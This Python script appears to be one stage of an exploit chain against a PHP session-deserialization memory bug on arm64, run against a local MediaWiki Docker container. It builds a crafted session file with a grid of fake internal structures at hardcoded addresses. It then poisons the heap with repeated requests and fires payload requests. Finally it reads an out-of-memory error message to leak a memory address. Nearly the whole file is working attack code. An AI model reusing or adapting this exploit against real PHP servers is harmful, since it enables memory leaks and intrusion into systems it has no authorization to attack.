#!/usr/bin/env python3
"""turn3_oracle.py - GLM5 turn-3 (2): the N-oracle wired at the arm64 hole.

HOLE (derived this turn via perf uprobes on ps_srlzr_decode_php):
  session files of 32KB..1MB -> ps_read buffer DATA lands at
  val = 0xe4d289c6e018 = d - 0x7FE8 (d = 0xe4d289c76000, the stale
  BG(unserialize).data), DETERMINISTICALLY. File offset f maps to
  address val + f  =>  file offset 0x7FE8 lands EXACTLY AT d.

CARRIER (single-fire oracle):
  session file = 'p|s:N:"<grid>";' + 'k|a:1:{i:0;R:1;}'
  - the 'p' big-string value carries a 0x200-periodic fake-d GRID
    (copies at file offsets == 0x1E8 mod 0x200 - valid for ANY
    page-aligned ps_read alloc start; absorbs placement drift)
  - each fake-d: last=d+0x38, used_slots=1, data[0]=d+0x100,
    fake zval {value = (bg+0x330)-0x10, type_info=0x106 (IS_STRING)}
  - the trailing 'k|a:1:{i:0;R:1;}' pair decodes AFTER the buffer has
    covered d: on a STALE child init REUSES d (= our grid) -> the k
    array registers as data[1], R:1 resolves data[0] = the fake zval ->
    write-back encode appends *(TARGET)=*(bg+0x330)=the stale d bytes
    -> OOM fatal "tried to allocate N" with N == d = SELF-VERIFY.
Everything at FULLY STOCK php.ini-production (memory_limit=128M,
display_errors=Off; N read from the container log). Loopback-only,
docker exec only (no /proc helpers this turn).
"""
import base64
import re
import struct
import subprocess
import sys
import time
import uuid

sys.path.insert(0, "lanes/race-618/glm5")
import a3_arm64_mw as A
import matrixbleed as M

D_CANON = 0xe4d289c76000
BG = 0xe4d28cbae748
BG_DATA_OFF = 0x330
S = 65536                      # file size: inside the covering range
KPAIR = b"k|a:1:{i:0;R:1;}"
GRID_PERIOD = 0x200
GRID_RESIDUE = 0x1E8           # (d - 0x18 - p) mod 0x200 for page-aligned p
GRID_FROM, GRID_TO = 0x6FE8, 0x8FE8   # +/- 4KB around the canonical f_d


def fake_d_bytes(d, target):
    g = bytearray(0x118)
    q = lambda off, v: struct.pack_into("<Q", g, off, v)
    dw = lambda off, v: struct.pack_into("<I", g, off, v)
    q(0x00, d + 0x38)
    q(0x08, 0); q(0x10, 0); q(0x18, 0); q(0x20, 0); q(0x28, 0)
    q(0x30, 0x1000)
    dw(0x38, 1)
    q(0x40, 0)
    q(0x48, d + 0x100)
    q(0x100, target - 0x10)
    dw(0x108, 0x106)
    dw(0x10C, 0)
    return bytes(g)


def build_carrier(d, target):
    hdr = b'p|s:%d:"'
    # fixed-point on the digit count
    n = S - 2 - len(KPAIR) - len(hdr % 0)
    for _ in range(4):
        h = hdr % n
        n2 = S - 2 - len(KPAIR) - len(h)
        if n2 == n:
            break
        n = n2
    h = hdr % n
    content = bytearray(b"\x41" * n)   # 'A' filler (visible if leaked)
    fd = fake_d_bytes(d, target)
    for off in range(GRID_FROM, GRID_TO, GRID_PERIOD):
        coff = off - len(h)
        if coff < 0 or coff + len(fd) > n:
            continue
        content[coff:coff + len(fd)] = fd
    file = h + bytes(content) + b'";' + KPAIR
    assert len(file) == S, (len(file), S)
    return file


def fatal_since(ts):
    logs = A.logs_since(ts)
    return re.findall(r"tried to allocate (\d+)", logs)


def main():
    d = D_CANON
    target = BG + BG_DATA_OFF
    expected = d
    carrier = build_carrier(d, target)
    print(f"[*] carrier built: {len(carrier)}B, fake-d grid {GRID_FROM:#x}-{GRID_TO:#x} "
          f"period {GRID_PERIOD:#x}; TARGET=bg+0x330 expected N={expected} (0x{expected:x})")
    p = "/tmp/oracle_carrier.bin"
    open(p, "wb").write(carrier)

    def stage(sid):
        subprocess.run(["docker", "compose", "cp", p, f"mediawiki:/tmp/sess_{sid}"],
                       cwd=A.REPO, check=True, stdout=subprocess.DEVNULL)
        rc, _ = A.cexec(f"chown www-data:www-data /tmp/sess_{sid}; chmod 600 /tmp/sess_{sid}")
        return rc == 0

    wins = 0
    for rnd in range(6):
        # poison the pool generously (no /proc scan this turn)
        for i in range(6):
            s2 = "OA" + uuid.uuid4().hex[:23]
            assert A.stage_producer_file(s2)
            A.fire(A.mp_body(s2, b"P" * 8193))
        print(f"[*] round {rnd}: pool poisoned (6 producers)")
        for i in range(8):
            sid = "OB" + uuid.uuid4().hex[:24]
            assert stage(sid)
            t0 = time.time()
            r = M.fire.__wrapped__(M.mp_min(sid, "127.0.0.1", 8104, "/index.php")) if hasattr(M.fire, "__wrapped__") else None
            import socket
            # direct fire (loopback)
            try:
                s = socket.create_connection(("127.0.0.1", 8104), timeout=15)
                s.sendall(M.mp_min(sid, "127.0.0.1", 8104, "/index.php"))
                s.settimeout(20)
                buf = b""
                while True:
                    try:
                        dd = s.recv(65536)
                    except socket.timeout:
                        break
                    if not dd:
                        break
                    buf += dd
                s.close()
            except ConnectionResetError:
                buf = b"<RESET>"
            time.sleep(0.3)
            fatals = fatal_since(t0)
            tag = f"resp={len(buf)}B"
            hit = None
            for f in fatals:
                n = int(f)
                if n == expected:
                    hit = n
                elif n > 1e9 and n != 75000032:
                    tag += f" foreign-N={n} (0x{n:x})"
            if hit:
                wins += 1
                print(f"  [{i}] *** ORACLE: N == *(bg+0x330) == d == {hit} (0x{hit:x}) ***")
                break
            print(f"  [{i}] {tag} fatals={fatals[-2:] if fatals else 'none'}")
        if wins:
            break
    print("[*]", "ORACLE PROVEN AT STOCK INIs ON ARM64" if wins else "no win; see notes")
    return 0 if wins else 1


if __name__ == "__main__":
    sys.exit(main())
